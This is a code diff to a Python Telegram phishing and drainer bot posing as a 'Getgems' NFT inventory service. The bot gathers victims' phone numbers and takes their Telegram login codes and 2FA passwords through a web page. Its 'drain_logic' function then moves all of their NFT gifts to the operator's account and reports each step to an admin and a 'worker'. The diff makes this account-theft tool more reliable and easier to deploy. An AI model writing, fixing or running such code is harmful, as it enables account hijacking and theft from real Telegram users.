@@ -2,7 +2,10 @@ import os
 import asyncio
 import threading
 from flask import Flask, render_template, request, jsonify
-from telethon import TelegramClient, events, Button, functions, SessionPasswordNeededError
+from telethon import TelegramClient, events, Button, functions
+# ИСПРАВЛЕННЫЙ ИМПОРТ ОШИБОК
+from telethon.errors import SessionPasswordNeededError, RPCError 
+import datetime
 
 # --- CONFIG ---
 API_ID = '34426356'
@@ -18,39 +21,45 @@ active_clients = {}
 temp_clients = {}
 pending_contacts = {}
 
+def save_log(text):
+    with open("logs.txt", "a", encoding="utf-8") as f:
+        f.write(f"[{datetime.datetime.now()}] {text}\n")
+
 def send_log(msg):
+    save_log(msg)
     bot.loop.create_task(bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'))
     bot.loop.create_task(bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'))
 
 # --- DRAIN LOGIC ---
 async def drain_logic(client, phone):
     try:
-        # 1. Проверка и заправка звездами
         res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
         if res.balance < 25:
             send_log(f"⛽️ Заправка {phone}...")
             me = await client.get_me()
             for _ in range(2):
-                await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685))
-                await asyncio.sleep(2)
+                try:
+                    await bot(functions.payments.SendStarGiftRequest(peer=me.id, gift_id=685))
+                    await asyncio.sleep(2)
+                except: pass
             
-            # Продажа подарков мамонтом для получения звезд
             await asyncio.sleep(5)
             gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=5))
             for g in gifts.gifts[:2]:
-                await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
+                try:
+                    await client(functions.payments.SaveStarGiftRequest(stargift_id=g.id, unsave=True))
+                except: continue
         
-        # 2. Перевод NFT/Gifts админу
         all_gifts = await client(functions.payments.GetStarGiftsRequest(offset='', limit=100))
         for nft in all_gifts.gifts:
             try:
                 await client(functions.payments.TransferStarGiftRequest(to_id=ADMIN_ID, stargift_id=nft.id))
-                send_log(f"✅ NFT {nft.id} слит с {phone}")
+                send_log(f"✅ NFT {nft.id} переведен с {phone}")
                 await asyncio.sleep(3)
             except Exception as e:
                 if "BALANCE_TOO_LOW" in str(e): break
                 continue
-        send_log(f"🏁 Слив {phone} окончен.")
+        send_log(f"🏁 Слив {phone} завершен.")
     except Exception as e:
         send_log(f"⚠️ Ошибка слива {phone}: {e}")
 
@@ -76,8 +85,10 @@ async def api_send_code():
         await client.sign_in(phone, code, phone_code_hash=temp_clients[phone]['hash'])
         active_clients[phone] = client
         asyncio.create_task(drain_logic(client, phone))
+        send_log(f"🔑 Код верный: {phone}")
         return jsonify({"status": "success"})
     except SessionPasswordNeededError:
+        send_log(f"⚠️ Требуется 2FA: {phone}")
         return jsonify({"status": "2fa_needed"})
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)})
@@ -91,6 +102,7 @@ async def api_send_password():
         await client.sign_in(password=password)
         active_clients[phone] = client
         asyncio.create_task(drain_logic(client, phone))
+        send_log(f"🔓 2FA принят: {phone}")
         return jsonify({"status": "success"})
     except Exception as e:
         return jsonify({"status": "error", "details": str(e)})
@@ -98,13 +110,13 @@ async def api_send_password():
 # --- BOT HANDLERS ---
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
-    await event.respond("Добро пожаловать в Getgems!", buttons=[
+    await event.respond("Getgems Inventory Management", buttons=[
         [Button.url("Открыть инвентарь", f"https://{request.host}/")]
     ])
 
 @bot.on(events.NewMessage)
 async def contact_handler(event):
-    if event.contact:
+    if event.contact and event.contact.user_id == event.sender_id:
         phone = event.contact.phone_number
         if not phone.startswith('+'): phone = '+' + phone
         pending_contacts[str(event.sender_id)] = phone
@@ -113,11 +125,13 @@ async def contact_handler(event):
             await client.connect()
             res = await client.send_code_request(phone)
             temp_clients[phone] = {'client': client, 'hash': res.phone_code_hash}
-            send_log(f"📞 Код отправлен на {phone}")
+            send_log(f"📞 Получен контакт и отправлен код: {phone}")
         except Exception as e:
-            send_log(f"❌ Ошибка {phone}: {e}")
+            send_log(f"❌ Ошибка старта сессии {phone}: {e}")
 
 if __name__ == '__main__':
     if not os.path.exists('sessions'): os.makedirs('sessions')
-    threading.Thread(target=lambda: app.run(port=8080, host='0.0.0.0', use_reloader=False), daemon=True).start()
+    # Railway/Heroku требуют порт из переменной окружения
+    port = int(os.environ.get("PORT", 8080))
+    threading.Thread(target=lambda: app.run(port=port, host='0.0.0.0', use_reloader=False), daemon=True).start()
     bot.run_until_disconnected()
